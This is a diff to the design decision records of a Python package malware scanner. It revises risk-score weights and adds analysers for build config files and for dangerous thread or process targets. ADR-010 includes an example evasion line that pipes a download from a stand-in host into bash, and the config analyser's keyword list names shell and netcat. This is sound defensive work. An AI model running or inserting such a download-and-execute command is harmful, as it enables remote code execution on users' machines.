@@ -79,15 +79,17 @@ The risk score uses three layers of control:
 
 Severity weights (unchanged): LOW=1, MEDIUM=3, HIGH=7, CRITICAL=15.
 
-**Per-analyser caps (v0.3.0):**
+**Per-analyser caps (v0.3.0, updated for new analysers):**
 
 | Analyser | Cap | Rationale |
 |---|---|---|
 | `obfuscation` | 20 | exec(b64decode) — almost never legitimate |
 | `setup_scripts` | 20 | Install hooks — high-confidence attack vector |
 | `code_exec` | 15 | eval/exec — suspicious but used in templating |
+| `config_files` | 15 | pyproject.toml/setup.cfg hooks — high-confidence attack vector |
 | `subprocess` | 12 | Common in build tools and CLI wrappers |
 | `filesystem` | 12 | Destructive ops + sensitive paths |
+| `process_spawn` | 12 | Process/Thread with dangerous OS target — high confidence |
 | `network` | 8 | Normal for HTTP libraries |
 | `dynamic_imports` | 6 | Used in legitimate plugin systems |
 | `env_access` | 5 | Ubiquitous in CLI tools and 12-factor apps |
@@ -106,9 +108,11 @@ Severity weights (unchanged): LOW=1, MEDIUM=3, HIGH=7, CRITICAL=15.
 | Combo | Bonus | Min severity required | Meaning |
 |---|---|---|---|
 | `env_access` + `network` | +25 | **CRITICAL** (both sides) | Credential exfiltration pattern |
-| `network` + `subprocess` | +10 | HIGH (both sides) | Download and execute pattern |
 | `obfuscation` + `code_exec` | +20 | HIGH (both sides) | Obfuscated payload pattern |
+| `process_spawn` + `env_access` | +15 | HIGH (both sides) | Credential access + process spawn |
+| `network` + `subprocess` | +10 | HIGH (both sides) | Download and execute pattern |
 | `setup_scripts` + `subprocess` | +10 | HIGH (both sides) | Install hook with shell commands |
+| `process_spawn` + `network` | +10 | HIGH (both sides) | Network + process spawn (download+exec) |
 
 **Why `env_access + network` requires CRITICAL:** Legitimate cloud SDKs (boto3, stripe-python, google-cloud-*) read credential env vars inside functions (HIGH severity) and make HTTPS calls (HIGH severity). The original HIGH gate caused these packages to score HIGH — a false positive. The attack pattern we target is *module-level* credential theft that auto-executes at import time; module-level findings already escalate to CRITICAL via ADR-005. Requiring CRITICAL from both sides restricts the combo to the true attack pattern without penalising legitimate SDKs.
 
@@ -126,7 +130,8 @@ Combo bonuses add signal for multi-category packages: a package that BOTH exfilt
 
 - `requests` → MODERATE (~31); `click` → MODERATE (~29); `more-itertools` → LOW (~0).
 - A package with `exec(b64decode(...))` + install hook + module-level subprocess → CRITICAL.
-- Caps and thresholds should be re-evaluated after Phase 2 analyser fixes (false-positive reductions) are merged, as those will change raw finding counts.
+- The two new analysers (`config_files`, `process_spawn`) added in v0.3.x increase coverage without raising false-positive rates — both target high-confidence patterns.
+- Caps and thresholds should be re-evaluated whenever new analysers are added, as they change the raw finding distribution.
 
 ---
 
@@ -242,3 +247,65 @@ Binary analysis is explicitly out of scope for v0.3.0. pkgxray only analyses Pyt
 - Packages that hide malicious logic entirely in compiled extensions will not be flagged.
 - The scan result's `skipped_files` list already captures files that could not be analysed, providing transparency.
 - This limitation is documented in Section 8 (Assumption #3) of the project instructions.
+
+---
+
+## ADR-009: ConfigFileAnalyzer — Static Analysis of pyproject.toml and setup.cfg
+
+**Status:** Accepted
+**Date:** 2026 (v0.3.x)
+
+### Decision
+A ninth analyser, `ConfigFileAnalyzer`, was added to inspect `pyproject.toml` and `setup.cfg` without using `ast.parse()`. It uses `tomllib` (stdlib ≥ 3.11, or `tomli` as a fallback) and `configparser` respectively.
+
+### Rationale
+- Malicious packages increasingly embed attack vectors in build configuration rather than Python source code: suspicious `[build-system].requires` dependencies (network libraries at build time), shell commands in entrypoints, and post-install hooks.
+- These files are not valid Python, so `ast.parse()` cannot be used. A dedicated parser is required.
+- The analyser is gated by the `is_config` flag on `ExtractedFile`, so it never runs on `.py` files, and no Python analyser runs on config files.
+
+### Design choices
+- **tomllib unavailability is graceful:** if neither `tomllib` (Python ≥ 3.11) nor `tomli` is installed, the file is recorded in `skipped_files` with reason `"tomllib_unavailable"` and a `logger.warning` is emitted once per process.
+- **Entrypoint validation:** a regex (`_PYTHON_EP_RE`) distinguishes legitimate `module:function` entrypoints from shell command strings before applying keyword matching.
+- **Short keyword matching:** keywords of ≤ 2 characters (`sh`, `nc`) require whole-word boundary matching to avoid false positives on identifiers like `bash_utils`.
+
+### Consequences
+- Packages that use `pyproject.toml` entrypoints to run shell commands at install time are now detected.
+- Requires `tomli` as an optional dependency for Python < 3.11.
+- Cap set to 15 (same as `code_exec`) — high-confidence patterns with limited false-positive risk.
+
+---
+
+## ADR-010: ProcessSpawnAnalyzer — Dangerous Callable Passed as Thread/Process Target
+
+**Status:** Accepted
+**Date:** 2026 (v0.3.x)
+
+### Decision
+A tenth analyser, `ProcessSpawnAnalyzer`, detects when dangerous OS or subprocess functions are passed as the `target=` argument to `multiprocessing.Process`, `threading.Thread`, or executor `.submit()`/`.map()` calls.
+
+### Rationale
+- The `SubprocessAnalyzer` and `CodeExecAnalyzer` detect *direct* dangerous calls. A known evasion technique is to pass the dangerous function as a *reference* to a thread/process launcher:
+
+  ```python
+  # Evades SubprocessAnalyzer — no direct subprocess.run() call visible
+  threading.Thread(target=os.system, args=("curl http://evil.com | bash",)).start()
+  ```
+
+- This pattern is high-confidence: passing `os.system`, `subprocess.Popen`, `os.execvp`, etc. as a process/thread target is almost never legitimate in a library package.
+- The analyser resolves module aliases (e.g. `import os as o`) via the shared `collect_import_aliases()` utility.
+
+### Scope
+Covers:
+- `multiprocessing.Process(target=...)` and `threading.Thread(target=...)`
+- `executor.submit(callable, ...)` and `executor.map(callable, ...)`
+- All `os.spawn*`, `os.system`, `os.popen`, `os.execvp/execv`, `os.startfile`
+- All `subprocess.run/call/Popen/check_output/check_call/getoutput/getstatusoutput`
+
+Does **not** cover:
+- Arbitrary callable objects or lambda wrappers
+- `asyncio` task creation with dangerous callables
+
+### Consequences
+- False-positive risk is low: the dangerous target must resolve to a known OS/subprocess function name after alias resolution.
+- Cap set to 12 (same as `subprocess`) — comparable confidence and false-positive profile.
+- Two new combo bonuses added in `scorer.py`: `process_spawn + env_access` (+15) and `process_spawn + network` (+10).
